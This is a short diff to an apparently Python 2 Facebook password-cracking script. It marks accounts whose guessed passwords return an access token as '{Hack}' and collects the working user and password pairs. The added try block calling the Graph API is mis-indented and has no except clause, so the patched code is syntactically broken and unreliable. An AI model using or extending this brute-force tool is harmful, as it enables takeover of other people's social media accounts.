@@ -434,6 +434,10 @@ def pilih_super():
 															if 'access_token' in q:
 																print '\x1b[1;92m☞{Hack}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass7
 																oks.append(user+pass7)
+try:
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			b = json.loads(a.text)
+			
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
 																	print '\x1b[1;95m☞{CP}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass7
